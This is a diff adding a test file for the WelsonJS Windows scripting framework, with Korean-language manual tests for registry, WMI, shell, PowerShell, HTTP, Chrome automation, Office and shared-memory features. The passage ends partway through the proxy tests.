@@ -1,0 +1,1549 @@
+
+var test_implements = {
+    // https://gist.github.com/CityRay/c56e4fa874af9370cc1a367bd43095b0
+    "es5_polyfills": function() {
+        var parseIntIgnoresLeadingZeros = (function () {
+            return parseInt('010', 10) === 10;
+        }());
+        console.log("parseIntIgnoresLeadingZeros: " + String(parseIntIgnoresLeadingZeros) + " (Default on the built-in engine: true)");
+
+        var DateISOString = (function () {
+            return !!(Date && Date.prototype && Date.prototype.toISOString);
+        }());
+        console.log("DateISOString: " + String(DateISOString) + " (Default on the built-in engine: false)");
+
+        var result = !!(parseIntIgnoresLeadingZeros && DateISOString);
+
+        console.log(result ?
+            "ECMAScript 5 수준의 런타임입니다. 필수 테스트를 모두 통과하였습니다." :
+            "ECMAScript 5 수준의 런타임이 아닙니다. 필수 테스트 중 하나를 실패하였습니다.");
+    },
+
+    // https://learn.microsoft.com/en-us/previous-versions/windows/desktop/regprov/stdregprov
+    "registry_find_provider": function() {
+        var REG = require("lib/registry");
+
+        console.log("레지스트리 제공자(StdRegProv) 클래스에 접근을 시도합니다.");
+        var provider = REG.getProvider();
+        
+        console.log(typeof provider !== "undefined" ?
+            "레지스트리 제공자 클래스에 성공적으로 연결되었습니다." :
+            "레지스트리 제공자 클래스에 연결하는데 문제가 있습니다.");
+    },
+
+    "registry_write": function() {
+        var REG = require("lib/registry");
+        var appName = "welsonjs";
+        
+        console.log("레지스트리에 쓰기를 시도합니다.");
+        REG.write(REG.HKCU, appName + "\\WelsonJSTest", "", "here are in", REG.STRING);
+        console.log("레지스트리에 쓰기를 완료하였습니다.");
+    },
+
+    "registry_read": function() {
+        var REG = require("lib/registry");
+        var appName = "welsonjs";
+        
+        console.log("레지스트리 읽기를 시도합니다.");
+        var response = REG.read(REG.HKCU, appName + "\\WelsonJSTest", "", REG.STRING);
+        console.log("읽음: " + response);
+        console.log(response === "here are in" ?
+            "레지스트리를 정상적으로 읽었습니다." :
+            "레지스트리를 읽는데 문제가 있습니다.");
+    },
+
+    "wmi_create_object": function() {
+        var WMI = require("lib/wmi");
+        console.log(typeof WMI.create().interface !== "undefined" ?
+            "WMI 객체를 정상적으로 생성하였습니다." :
+            "WMI 객체를 생성하는데 문제가 있습니다.");
+    },
+
+    "wmi_execute_query": function() {
+        var WMI = require("lib/wmi");
+
+        var queryString = "SELECT Caption FROM Win32_OperatingSystem";
+        console.log("실행할 쿼리: " + queryString);
+
+        var result = WMI.execQuery(queryString).fetch().get("Caption").trim();
+        console.log("현재 윈도우즈 배포판 종류: " + result);
+    },
+
+    "wmi_result_query": function() {
+        var WMI = require("lib/wmi");
+
+        var queryString = "SELECT Caption FROM Win32_OperatingSystem";
+        console.log("실행할 쿼리: " + queryString);
+
+        var result = WMI.execQuery(queryString).fetch().get("Caption").trim();
+        console.log("현재 윈도우즈 배포판 종류: " + result);
+    },
+
+    "shell_create_object": function() {
+        var SHELL = require("lib/shell");
+        console.log(typeof SHELL.create().interface !== "undefined" ?
+            "윈도우즈 쉘(Shell) 객체를 정상적으로 생성하였습니다." :
+            "윈도우즈 쉘(Shell) 객체를 생성하는데 문제가 있습니다.");
+    },
+
+    "shell_build_command_line": function() {
+        var SHELL = require("lib/shell");
+        console.log("쉘 명령의 무결성을 훼손시킬 수 있는 경우(따옴표, 쌍따옴표, 띄어쓰기 등을 포함한 경우)를 테스트합니다.");
+
+        // 모든 경우를 하나의 배열에 포함
+        var test_args = [
+            "ppap.exe",
+            "\"pen\"",
+            "'apple'",
+            "apple pen",
+            "pineapple pen"
+        ];
+        
+        // 입력과 출력 확인
+        console.log("입력 인자: " + test_args.join(" / "));
+        console.log("출력 문자열: " + SHELL.build(test_args));
+        console.log("정상적으로 명령행이 만들어졌는지 확인하세요.");
+    },
+
+    "shell_set_charset": function() {
+        var SHELL = require("lib/shell");
+
+        var ShellInstance = SHELL.create();
+        console.log("현재 기준 문자셋: " + ShellInstance.charset);
+        console.log("기준 문자셋을 유니코드(UTF-8)로 변경합니다.");
+        ShellInstance.setCharset(SHELL.CdoCharset.CdoUTF_8);
+        console.log("현재 기준 문자셋: " + ShellInstance.charset);
+    },
+
+    "shell_working_directory": function() {
+        var SHELL = require("lib/shell");
+
+        var ShellInstance = SHELL.create();
+        console.log("현재 작업 폴더: " + ShellInstance.workingDirectory);
+
+        console.log("작업 폴더를 변경합니다.");
+        ShellInstance.setWorkingDirectory(ShellInstance.workingDirectory + "\\data");
+        console.log("현재 작업 폴더: " + ShellInstance.workingDirectory);
+    },
+
+    "shell_create_process": function() {
+        var SHELL = require("lib/shell");
+
+        var shell = SHELL.create();
+        var process = shell.createProcess("calc.exe");
+        sleep(1500);
+        var processId = process.ProcessId;
+        console.log("프로세스 ID:", processId);
+        sleep(1500);
+        shell.release();
+
+        console.log("계산기가 정상적으로 실행되었는지 확인하세요.");
+    },
+
+    "shell_execute": function() {
+        var SHELL = require("lib/shell");
+
+        var response = SHELL.exec("echo done");
+        console.log(response == "done" ?
+            "쉘(Shell) 출력이 정상적으로 작동합니다." :
+            "쉘(Shell) 출력에 문제가 있습니다.");
+    },
+
+    "shell_run": function() {
+        var SHELL = require("lib/shell");
+
+        SHELL.run("calc");
+        console.log("잠시 후 계산기 프로그램이 열리는지 확인하여 주세요.");
+    },
+
+    "shell_run_as": function() {
+        var SHELL = require("lib/shell");
+
+        console.log("관리자 권한 요청을 확인하세요.");
+        SHELL.runAs("calc");
+        console.log("잠시 후 계산기 프로그램이 열리는지 확인하여 주세요.");
+    },
+
+    "shell_find_my_documents": function() {
+        var SHELL = require("lib/shell");
+
+        console.log("내 문서 폴더 위치: " + SHELL.getPathOfMyDocuments());
+    },
+
+    "shell_release": function() {
+        var SHELL = require("lib/shell");
+
+        var ShellInstance = SHELL.create();
+        ShellInstance.release();
+
+        console.log(ShellInstance.interface != null ?
+            "정상적으로 해제되지 않았습니다." :
+            "정상적으로 해제되었습니다.");
+    },
+
+    "powershell_set_command": function() {
+        var PS = require("lib/powershell");
+        var PSInstance = PS.create();
+        PSInstance.load("Write-Output \"hello world\"");
+        console.log("설정된 명령어: " + PSInstance.target);
+    },
+
+    "powershell_set_file": function() {
+        var PS = require("lib/powershell");
+        var PSInstance = PS.create();
+        PSInstance.loadFile("app\\assets\\ps1\\helloworld");
+        console.log("설정된 파일: " + PSInstance.target);
+    },
+
+    "powershell_set_uri": function() {
+        var PS = require("lib/powershell");
+        var PSInstance = PS.create();
+        PSInstance.loadURI("data:text/plain;base64,V3JpdGUtT3V0cHV0ICJoZWxsbyB3b3JsZCI=");
+        console.log("설정된 URI: " + PSInstance.target);
+    },
+
+    "powershell_execute": function() {
+        var PS = require("lib/powershell");
+        var response = PS.execScript("app\\assets\\ps1\\helloworld");
+        console.log("실행 결과 값: " + response);
+    },
+
+    "powershell_run_as": function() {
+        var PS = require("lib/powershell");
+        var response = PS.runAs("app\\assets\\ps1\\helloworld");
+        console.log("실행 결과 값: " + response);
+    },
+
+    "system_resolve_env": function() {
+        var SYS = require("lib/system");
+
+        console.log("기본 프로그램 설치 폴더: " + SYS.getEnvString("PROGRAMFILES"));
+        console.log("기본 프로그램 설치 폴더가 정상적인 위치를 가르키고 있는지 확인하세요.");
+    },
+
+    "system_check_as": function() {
+        var SYS = require("lib/system");
+
+        console.log(SYS.isElevated() ?
+            "이 런타임은 관리자 모드에서 실행되고 있지 않습니다." :
+            "이 런타임은 관리자 모드에서 실행되고 있습니다.");
+    },
+
+    "system_get_os_version": function() {
+        var SYS = require("lib/system");
+        
+        console.log("현재 사용중인 운영체제: " + SYS.getOS());
+    },
+
+    "system_get_architecture": function() {
+        var SYS = require("lib/system");
+        
+        console.log("현재 사용중인 아키텍처: " + SYS.getArch());
+    },
+
+    "system_get_uuid": function() {
+        var SYS = require("lib/system");
+
+        console.log("디바이스 고유 번호: " + SYS.getUUID());
+    },
+
+    "system_get_working_directory": function() {
+        var SYS = require("lib/system");
+
+        console.log("현재 작업 폴더: " + SYS.getCurrentWorkingDirectory());
+    },
+
+    "system_get_script_directory": function() {
+        var SYS = require("lib/system");
+
+        console.log("현재 스크립트 폴더: " + SYS.getCurrentScriptDirectory());
+    },
+
+    "system_get_network_interfaces": function() {
+        var SYS = require("lib/system");
+
+        var netInterfaces = SYS.getNetworkInterfaces();
+        netInterfaces.forEach(function(x) {
+            console.log(x.Caption);
+        });
+    },
+
+    "system_get_process_list": function() {
+        var SYS = require("lib/system");
+        
+        var processList = SYS.getProcessList();
+        processList.forEach(function(x) {
+            console.log(x.Caption, x.ProcessId);
+        });
+    },
+
+    "system_get_process_list_by_name": function() {
+        var SYS = require("lib/system");
+        
+        var processList = SYS.getProcessListByName("explorer.exe");
+        processList.forEach(function(x) {
+            console.log(x.Caption, x.ProcessId);
+        });
+    },
+
+    "system_register_uri": function() {
+        console.log("웹 브라우저를 열고 주소창에 아래 주소를 입력하세요.");
+        console.log("welsonjs:///?application=mscalc");
+    },
+
+    "system_pipe_ipc": function() {
+        var SHELL = require("lib/shell");
+        
+        for (var i = 0; i < 3; i++) {
+            SHELL.show(["cscript", "app.js", "examples/ipctest"]);
+        }
+    },
+
+    "vhid_find_window": function() {
+        console.log("동일한 기능이 포함된 chromium_send_click 또는 chromium_send_keys 테스트를 수행하십시오");
+    },
+
+    "vhid_send_click": function() {
+        console.log("동일한 기능이 포함된 chromium_send_click 테스트를 수행하십시오");
+    },
+
+    "vhid_send_keys": function() {
+        console.log("동일한 기능이 포함된 chromium_send_keys 테스트를 수행하십시오");
+    },
+
+    "vhid_send_key_enter": function() {
+        var Chrome = require("lib/chrome");
+        var wbInstance = Chrome.startDebugInPrivate("https://en.key-test.ru/", null, "welsonjs_test", 9222, true);
+
+        console.log("참고: vhid_send_key_enter 테스트의 엔터 키 기능은 웹 브라우저가 키코드를 처리하도록 작성되었습니다.");
+        console.log("5초 후 명령을 수행합니다.");
+        sleep(5000);
+
+        wbInstance.focus();
+        wbInstance.sendEnterKey();
+        sleep(1000);
+    },
+
+    "vhid_send_key_functions": function() {
+        var Toolkit = require("lib/toolkit");
+        var Chrome = require("lib/chrome");
+        var wbInstance = Chrome.startDebugInPrivate("https://example.org", null, "welsonjs_test", 9222, true);
+
+        console.log("웹 브라우저를 열고 F1 키를 눌러 도움말 페이지를 열겠습니다.");
+        console.log("5초 후 명령을 수행합니다.");
+        sleep(5000);
+
+        wbInstance.focus();
+        Toolkit.sendFnKey(wbInstance.pageId.substring(0, 6), 1);  // F1 키 누름
+    },
+
+    "vhid_alert": function() {
+        var Toolkit = require("lib/toolkit");
+
+        Toolkit.alert("잘 보이면 테스트에 성공한 것입니다.");
+    },
+ 
+    "vhid_confirm": function() {
+        var Toolkit = require("lib/toolkit");
+        
+        var answer = Toolkit.confirm("예 또는 아니오를 눌러주세요");
+        console.log(String(answer));
+    },
+
+    "vhid_prompt": function() {
+        var Toolkit = require("lib/toolkit");
+
+        var answer = Toolkit.prompt("Enter your input:");
+        console.log(String(answer));
+    },
+
+    "network_http_get": function() {
+        var HTTP = require("lib/http");
+
+        console.log("HTTP GET 요청으로 내 외부 IP를 확인합니다.");
+        var response = HTTP.get("https://api.ipify.org/", {}, {});
+        console.log("내 외부 IP: " + response);
+    },
+
+    "network_http_post": function() {
+        var HTTP = require("lib/http");
+
+        var response = HTTP.get("https://httpbin.org/post", {}, {});
+        console.log("응답: " + response);
+    },
+
+    "network_http_extended": function() {
+        var HTTP = require("lib/http");
+
+        var response1 = HTTP.put("https://httpbin.org/put", {}, {});
+        console.log("응답: " + response1);
+        
+        var response2 = HTTP.patch("https://httpbin.org/patch", {}, {});
+        console.log("응답: " + response2);
+    },
+
+    "network_attach_debugger": function() {
+        var HTTP = require("lib/http");
+
+        HTTP.create("CURL")
+            .attachDebugger("FIDDLER")
+            .get("https://api.ipify.org/");
+    },
+
+    "network_detect_charset": function() {
+        var HTTP = require("lib/http");
+
+        var response = HTTP.get("https://example.org/", {}, {});
+        var charset = HTTP.create("CURL").detectCharset(response);
+
+        console.log("감지된 문자셋: " + charset);
+    },
+
+    "network_detect_http_ssl": function() {
+        var HTTP = require("lib/http");
+
+        var response = HTTP.create("CURL").get("https://example.org/");
+        var charset = HTTP.create("CURL").detectCharset(response);
+    },
+
+    "network_send_icmp": function() {
+        var SYS = require("lib/system");
+
+        console.log("1.1.1.1로 PING(ICMP) 전송");
+        console.log("응답 시간: " + SYS.ping("1.1.1.1") + "ms");
+    },
+
+    "network_bitsadmin_test": function() {
+        var HTTP = require("lib/http");
+        var bits = HTTP.create("BITS");
+        var response = bits.open("GET", "https://httpbin.org/get").send().responseText;
+        console.log(response);
+    },
+
+    "extramath_dtm": function() {
+        var ExtraMath = require("lib/extramath");
+        
+        var a = "this is an apple";
+        var b = "this is red apple";
+        
+        var dtm = new ExtraMath.DTM();
+        dtm.add(a);
+        dtm.add(b);
+        var mat = dtm.toArray();
+
+        console.log("Original sentance");
+        console.log(a);
+        console.log(b);
+
+        console.log("Create a DTM(Document-Term Matrix)");
+        console.log(mat[0].join(' '));
+        console.log(mat[1].join(' '));
+    },
+
+    "extramath_cosine_similarity": function() {
+        var ExtraMath = require("lib/extramath");
+        
+        var a = "this is an apple";
+        var b = "this is red apple";
+
+        var dtm = new ExtraMath.DTM();
+        dtm.add(a);
+        dtm.add(b);
+        var mat = dtm.toArray();
+
+        console.log("Original sentance");
+        console.log(a);
+        console.log(b);
+
+        console.log("Create a DTM(Document-Term Matrix)");
+        console.log(mat[0].join(' '));
+        console.log(mat[1].join(' '));
+
+        console.log("Measure Cosine Similarity");
+        console.log('' + ExtraMath.arrayCos(mat[0], mat[1]));
+        console.log('' + ExtraMath.measureSimilarity(a, b));
+    },
+
+    "base64_encode": function() {
+        var BASE64 = require("lib/base64");
+        
+        var original_text = "hello world";
+        var encoded_text = BASE64.encode(original_text);
+
+        console.log("원문: " + original_text);
+        console.log("인코딩된 문자: " + encoded_text);
+        
+        console.log(encoded_text == "aGVsbG8gd29ybGQ=" ?
+            "인코딩된 문자가 기대값과 일치합니다." :
+            "인코딩된 문자가 기대값과 불일치합니다.");
+    },
+
+    "base64_decode": function() {
+        var BASE64 = require("lib/base64");
+
+        var encoded_text = "aGVsbG8gd29ybGQ=";
+        var original_text = BASE64.decode(encoded_text);
+        
+        console.log("인코딩된 문자: " + encoded_text);
+        console.log("원문: " + original_text);
+
+        console.log(original_text == "hello world" ?
+            "디코드된 문자가 기대값과 일치합니다." :
+            "디코드된 문자가 기대값과 불일치합니다.");
+    },
+
+    "chromium_run": function() {
+        var Chrome = require("lib/chrome");
+        Chrome.startDebugInPrivate("https://example.org", null, "welsonjs_test", 9222, true);
+    },
+
+    "chromium_create_profile": function() {
+        var Chrome = require("lib/chrome");
+        console.log("welsonjs_test 프로파일을 생성합니다. (웹 브라우저를 실행하여 생성합니다.)");
+        Chrome.startDebug("https://example.org", null, "welsonjs_test", 9222, true);
+    },
+
+    "chromium_run_incognito": function() {
+        var Chrome = require("lib/chrome");
+        Chrome.startDebugInPrivate("https://example.org", null, "welsonjs_test", 9222, true);
+    },
+
+    "chromium_navigate": function() {
+        var Chrome = require("lib/chrome");
+        var wbInstance = Chrome.startDebugInPrivate("https://example.org", null, "welsonjs_test", 9222, true);
+        
+        console.log("5초 후 구글로 이동합니다.");
+        sleep(5000);
+
+        wbInstance.setPageId(null);
+        wbInstance.navigate("https://google.com");
+    },
+
+    "chromium_get_active_pages": function() {
+        var Chrome = require("lib/chrome");
+        var wbInstance = Chrome.startDebugInPrivate("https://example.org", null, "welsonjs_test", 9222, true);
+        
+        console.log("5초 후 페이지 목록을 불러옵니다.");
+        sleep(5000);
+
+        var pageList = wbInstance.getPageList();
+        pageList.forEach(function(x) {
+            console.log(x.title);
+        });
+    },
+
+    "chromium_find_page_by_id": function() {
+        var Chrome = require("lib/chrome");
+        var wbInstance = Chrome.startDebugInPrivate("https://example.org", null, "welsonjs_test", 9222, true);
+        
+        console.log("5초 후 페이지 ID를 불러옵니다.");
+        sleep(5000);
+
+        var pageId = wbInstance.getPageList()[0].id;
+        console.log("페이지 ID: " + pageId);
+
+        console.log("페이지 ID로 페이지 찾기");
+        var page = wbInstance.getPageById(pageId);
+
+        console.log("페이지 제목: " + page.title);
+    },
+
+    "chromium_find_pages_by_title": function() {
+        var Chrome = require("lib/chrome");
+        var wbInstance = Chrome.startDebugInPrivate("https://example.org", null, "welsonjs_test", 9222, true);
+        
+        console.log("5초 후 페이지 타이틀을 불러옵니다.");
+        sleep(5000);
+
+        var pageTitle = wbInstance.getPageList()[0].title;
+        console.log("페이지 타이틀: " + pageTitle);
+
+        console.log("페이지 타이틀로 페이지 찾기");
+        var pages = wbInstance.getPagesByTitle(pageTitle);   // 타이틀로 찾는 경우 복수형으로 반환됨
+
+        console.log("페이지 ID: " + pages[0].id);
+    },
+
+    "chromium_move_focused": function() {
+        var Chrome = require("lib/chrome");
+        
+        var wbInstances = [];
+        wbInstances.push(Chrome.startDebugInPrivate("https://example.org", null, "welsonjs_test", 9222, true));
+        sleep(2000);
+        wbInstances.push(Chrome.startDebugInPrivate("https://naver.com", null, "welsonjs_test_2", 9223, true));
+        sleep(2000);
+        wbInstances.push(Chrome.startDebugInPrivate("https://daum.net", null, "welsonjs_test_3", 9224, true));
+        sleep(2000);
+
+        var wbInstance = wbInstances[1];
+        wbInstance.setPageId(null);
+        wbInstance.focus();
+    },
+
+    "chromium_adjust_window_size": function() {
+        var Chrome = require("lib/chrome");
+        var wbInstance = Chrome.startDebugInPrivate("https://example.org", null, "welsonjs_test", 9222, true);
+
+        console.log("5초 후 명령을 수행합니다.");
+        sleep(5000);
+
+        wbInstance.focus();
+        wbInstance.autoAdjustByWindow(10, 10, 1024, 1280, 720, 768);
+    },
+
+    "chromium_get_element_position": function() {
+        var Chrome = require("lib/chrome");
+        var wbInstance = Chrome.startDebugInPrivate("https://example.org", null, "welsonjs_test", 9222, true);
+        
+        console.log("5초 후 명령을 수행합니다.");
+        sleep(5000);
+        
+        console.log(JSON.stringify(wbInstance.getElementPosition("p")));
+    },
+
+    "chromium_get_mapreduced_element_position": function() {
+        var Chrome = require("lib/chrome");
+        var wbInstance = Chrome.startDebugInPrivate("https://example.org", null, "welsonjs_test", 9222, true);
+        
+        console.log("5초 후 명령을 수행합니다.");
+        sleep(5000);
+
+        console.log("More information... 버튼의 위치를 탐색");
+        console.log(JSON.stringify(wbInstance.getNestedElementPosition("p", ":self", "More information...")));
+    },
+
+    "chromium_set_value_to_textbox": function() {
+        var Chrome = require("lib/chrome");
+        var wbInstance = Chrome.startDebugInPrivate("https://html5doctor.com/demos/forms/forms-example.html", null, "welsonjs_test", 9222, true);
+        
+        console.log("5초 후 명령을 수행합니다.");
+        sleep(5000);
+
+        wbInstance.setValue("#given-name", "길동");
+        wbInstance.setValue("#family-name", "홍");
+    },
+
+    "chromium_send_click": function() {
+        var RAND = require("lib/rand");
+        var Chrome = require("lib/chrome");
+        var wbInstance = Chrome.startDebugInPrivate("https://html5doctor.com/demos/forms/forms-example.html", null, "welsonjs_test", 9222, true);
+        
+        console.log("5초 후 명령을 수행합니다.");
+        sleep(5000);
+        
+        wbInstance.focus();
+        wbInstance.traceMouseClick();
+
+        while (true) {
+            wbInstance.vMouseClick(RAND.getInt(20, 200), RAND.getInt(20, 200));
+            sleep(2000);
+        }
+    },
+
+    "chromium_send_keys": function() {
+        var Chrome = require("lib/chrome");
+        var wbInstance = Chrome.startDebugInPrivate("https://html5doctor.com/demos/forms/forms-example.html", null, "welsonjs_test", 9222, true);
+        
+        console.log("5초 후 명령을 수행합니다.");
+        sleep(5000);
+        
+        wbInstance.focus();
+        wbInstance.traceMouseClick();
+
+        console.log("이메일 필드 위치 찾기");
+        var emailInputPosition = wbInstance.getElementPosition("#email");
+        wbInstance.vMouseClick(emailInputPosition.x + 2, emailInputPosition.y + 2);
+        sleep(1000);
+        
+        console.log("가상 키 보내기");
+        wbInstance.vSendKeys("hong@example.org");
+    },
+
+    "chromium_auto_scroll_until_end": function() {
+        var Chrome = require("lib/chrome");
+        var wbInstance = Chrome.startDebugInPrivate("https://en.wikipedia.org/wiki/Lorem_ipsum", null, "welsonjs_test", 9222, true);
+
+        console.log("5초 후 명령을 수행합니다.");
+        sleep(5000);
+        
+        wbInstance.focus();
+        wbInstance.traceMouseClick();
+
+        console.log("스크롤이 끝날 때까지 계속 스크롤을 조정합니다.");
+
+        while(!wbInstance.isPageScrollEnded()) {
+            wbInstance.scrollBy(0, 150);
+            sleep(2000);
+        }
+    },
+
+    "grpc_run_server": function() {
+        var SHELL = require("lib/shell");
+
+        SHELL.show(["cscript", "app.js", "grpcloader"]);
+    },
+
+    "grpc_receive_command": function() {
+        var SHELL = require("lib/shell");
+
+        SHELL.show(["grpcloader_test.bat"]);
+    },
+
+    "gui_check": function() {
+        console.log("GUI 환경에서 실행하여 주십시오");
+    },
+    
+    // profile: data/test-misc-20231107.json
+    "gtkserver_test": function() {
+        var GTK = require("lib/gtk");
+
+        function main() {
+            GTK.init(function() {
+                var win, table, button, entry, text, radiogroup, radio1, radio2;
+
+                // create new window
+                win = new GTK.Window({
+                    title: "WelsonJS GTK GUI Demo Application",
+                    width: 450,
+                    height: 400
+                });
+                
+                // create new table
+                table = new GTK.Table({
+                    rows: 50,
+                    columns: 50
+                });
+                win.setContainer(table);
+
+                // create new button
+                button = new GTK.Button({
+                    text: "Exit"
+                });
+                button.addEventListener("click", function() {
+                    GTK.exit();
+                });
+                table.attach(button, 41, 49, 45, 49);
+
+                // create new entry
+                entry = new GTK.Entry();
+                table.attach(entry, 1, 40, 45, 49);
+                entry.addEventListener("enter", function(event) {
+                    console.info(event.target.getText());
+                });
+
+                // create new textbox
+                text = new GTK.TextBox();
+                table.attach(text, 1, 49, 8, 44);
+                
+                // create new radiogroup
+                radiogroup = new GTK.RadioGroup();
+
+                // create new radio (Radio 1)
+                radio1 = new GTK.RadioBox({
+                    text: "Yes",
+                    group: radiogroup
+                });
+                table.attach(radio1, 1, 10, 1, 4);
+
+                // create new radio (Radio 2)
+                radio2 = new GTK.RadioBox({
+                    text: "No",
+                    group: radiogroup
+                });
+                table.attach(radio2, 1, 10, 4, 7);
+
+                // showing window
+                win.show();
+
+                // focusing entry
+                entry.focus();
+            });
+
+            GTK.wait();
+        }
+    },
+    
+    // profile: data/test-misc.json
+    "toolkit_msedge_test": function() {
+        var Chrome = require("lib/chrome");
+        var Toolkit = require("lib/toolkit");
+        
+        var wbInstance = Chrome.create().setVendor("msedge").open("https://google.com");
+        sleep(5000);
+        //console.log(wbInstance.getHTML("body"));
+
+        wbInstance.focus();
+        wbInstance.traceMouseClick();
+        Toolkit.sendClick("Google", 30, 30, 1);
+    },
+    
+    // profile: data/test-misc.json
+    "squel_sqlmap_test": function() {
+        console.log(squel.select({ separator: "\n" })
+            .from("students")
+            .field("name")
+            .field("MIN(test_score)")
+            .field("MAX(test_score)")
+            .field("GROUP_CONCAT(DISTINCT test_score ORDER BY test_score DESC SEPARATOR ' ')")
+            .group("name")
+            .toString());
+    },
+    
+    // profile: data/test-msoffice.json
+    "open_excel_file": function() {
+        var Office = require("lib/msoffice");
+
+        var excel = new Office.Excel();   // Create a Excel instance
+        excel.open("data\\example.xlsx");   // Open a Excel window
+    },
+
+    "open_excel_new": function() {
+        var Office = require("lib/msoffice");
+
+        var excel = new Office.Excel();   // Create a Excel instance
+        excel.open();   // Open a Excel window
+    },
+
+    "open_excel_with_chatgpt": function() {
+        // Load libraries
+        var Office = require("lib/msoffice");
+        var ChatGPT = require("lib/chatgpt");
+
+        // Create an Excel instance
+        var excel = new Office.Excel();
+
+        // List of questions
+        var questions = [
+            "Which one does Mom like, and which one does Dad like?",
+            "If 100 billion won is deposited into my bank account without my knowledge, what would I do?",
+            "If my friend passed out from drinking, and Arnold Schwarzenegger suggests having a drink together alone, is it okay to ditch my friend and go with him?",
+            "If there's a snake in our tent during the company camping trip, should I wake up the manager, or should I escape on my own without waking him up?",
+            "queen never cry"
+        ];
+
+        // Open the Excel window
+        excel.open();
+        
+        // Answer to questions
+        var i = 1;
+        questions.forEach(function(x) {
+            var answer = ChatGPT.chat(x);
+            console.log("Answer:", answer);
+            excel.getCellByPosition(i, 1).setValue(answer);
+            i++;
+        });
+
+        // Close the Excel window
+        //excel.close();
+    },
+    
+    "open_powerpoint_file": function() {
+        var Office = require("lib/msoffice");
+
+        var powerpoint = new Office.PowerPoint();   // Create a PowerPoint instance
+        powerpoint.open("data\\example.pptx");   // Open a PowerPoint window
+    },
+    
+    "open_powerpoint_new": function() {
+        var Office = require("lib/msoffice");
+
+        var powerpoint = new Office.PowerPoint();   // Create a PowerPoint instance
+        powerpoint.open();   // Open a PowerPoint window
+    },
+    
+    "open_word_file": function() {
+        var Office = require("lib/msoffice");    // Load libraries
+        var word = new Office.Word();   // Create an Word instance
+        word.open("data\\example.docx");   // Open the Word window
+    },
+    
+    "sharedmemory": function() {
+        var Toolkit = require("lib/toolkit");
+        var mem = new Toolkit.NamedSharedMemory("welsonjs_test");
+
+        console.log("Writing a text the to shared memory...");
+        mem.writeText("nice meet you");
+        
+        console.log("Reading a text from the shared memory...");
+        console.log(mem.readText() + ", too");
+        
+        console.log("Cleaning the shared memory...");
+        mem.clear()
+        console.log(mem.readText());
+
+        mem.close()
+        console.log("Closing the shared memory...");
+
+        console.log("Done");
+    },
+    
+    "sharedmemory_write": function() {
+        var Toolkit = require("lib/toolkit");
+        var mem = new Toolkit.NamedSharedMemory("welsonjs_test");
+
+        console.log("Writing a text to the shared memory...");
+        mem.writeText("nice meet you");
+
+        console.log("Done");
+    },
+
+    "sharedmemory_read": function() {
+        var Toolkit = require("lib/toolkit");
+        var mem = new Toolkit.NamedSharedMemory("welsonjs_test");
+
+        console.log("Reading a text from the shared memory...");
+        console.log(mem.readText() + ", too");
+
+        console.log("Cleaning the shared memory...");
+        mem.clear()
+        console.log(mem.readText());
+
+        mem.close()
+        console.log("Closing the shared memory...");
+
+        console.log("Done");
+    },
+
+    "sharedmemory_listener": function() {
+        var Toolkit = require("lib/toolkit");
+        var targets = (function() {
+            var s = Toolkit.prompt("Input the shared memory names (Comma seperated)");
+            return s.split(',');
+        })();
+
+        if (!targets) {
+            console.log("Aborted.");
+        } else {
+            // Open the shared memory
+            var memories = targets.map(function(x) {
+                return [x, new Toolkit.NamedSharedMemory(x)];
+            });
+
+            // Open the second process will be communicate
+            Toolkit.openProcess();
+
+            // Listen the shared memory
+            console.log("Listening the shared memory:", targets.join(', '));
+            while (true) {
+                console.log(new Date().toISOString());
+                memories.forEach(function(x) {
+                    var name = x[0];
+                    var mem = x[1];
+                    console.log(name + ": ", mem.readText());
+                });
+                sleep(100);
+            }
+        }
+    },
+
+    "string_split": function() {
+        var a = "monkey:red:apple:delicious:banana:long:train:fast:airplane:high:everest:sharp:seringue:painful";
+        var b = a.split(':').join(':');
+        var c = "a=1=b=2=c=3";
+        var d = c.split('=').join('=');
+        
+        if (a == b && c == d) {
+            console.log("PASS");
+        } else {
+            console.log("FAILED");
+            console.log(a);
+            console.log(b);
+            console.log(c);
+            console.log(d);
+        }
+    },
+    
+    "linqjs": function() {
+        var a = Enumerable.range(1, 10)
+            .where(function(i) { return i % 3 == 0; })
+            .select(function(i) { return i * 10; })
+        ;
+        console.log(a.toArray().join(','));
+        
+        var array = "monkey:red:apple:delicious:banana:long:train:fast:airplane:high:everest:sharp:seringue:painful".split(':');
+        var b = Enumerable.from(array).select(function(val, i) { 
+            return {
+                value: val,
+                index: i
+            }
+        });
+        console.log(JSON.stringify(b.toArray()));
+    },
+
+    // https://stackoverflow.com/questions/33417367/example-of-how-to-use-peg-js
+    "pegjs": function() {
+        var syntax = FILE.readFile("app/assets/pegjs/test.pegjs", FILE.CdoCharset.CdoUTF_8);
+        var parser = PEG.generate(syntax);
+        console.log(JSON.stringify(parser.parse("test123")));
+    },
+
+    "domparser_test": function() {
+        console.log(typeof DOMParser);
+    },
+
+    // https://github.com/gnh1201/caterpillar
+    "catproxy_test": function() {
+        var client = require('lib/catproxy');
+        
+        function main(args) {
+            var worker = client.create("http://locahost:5555");
+            worker.set_method("relay_mysql_query");
+            worker.set_env("mysql_username", "adminer");
+            worker.set_env("mysql_password", "changeme");
+            worker.set_env("mysql_database", "dummydb");
+
+            var result = worker.exec("select * from authors limit 3");
+            console.log(JSON.stringify(result));
+        }
+    },
+    
+    // https://catswords-oss.rdbl.io/5719744820/8278298336
+    "proxy_custom_provider": function() {
+        var HTTP = require("lib/http");
+        var CRED = require("lib/credentials");
+
+        var response = HTTP.create()
+            .setVariables({
+                "api_key": CRED.get("apikey", "scrapeops"),
+                "render_js": "false",
+                "residential": "false",
+                "country": "us",
+                "keep_headers": "false"
+            })
+            .setProxy({
+                "enabled": true,
+                "provider": "scrapeops",
+                "type": "stateless"
+            })
+            .open("GET", "https://example.org")
+            .send();
+
+        console.log("responseBody:", response.responseBody);
+    },
+    
+    // How to use: https://catswords-oss.rdbl.io/5719744820/8278298336
+    "proxy_serp": function() {
+        var HTTP = require("lib/http");
+        var CRED = require("lib/credentials");
+
+        var response = HTTP.create()
+            .setVariables({
+                "api_key": CRED.get("apikey", "serpapi")
+            })
+            .setProxy({
+                "enabled": true,
+                "provider": "serpapi",
+                "type": "serp"
+            })
+            .open("GET", "https://www.google.com/search?q=test")
+            .send();
+
+        console.log("responseBody:", response.responseBody);
+    },
+    
+    "proxy_stateless_jsonrpc2": function() {
+        var HTTP = require("lib/http");
+        
+        var response = HTTP.create()
+            .setProxy({
+                "enabled": true,
+                "provider": "github.com/gnh1201/caterpillar",
+                "type": "stateless-jsonrpc2",
+                "url": "https://localhost:8080"
+            })
+            .setDataType("json")
+            .open("GET", "https://example.org")
+            .send();
+
+        console.log("responseBody:", response.responseBody);
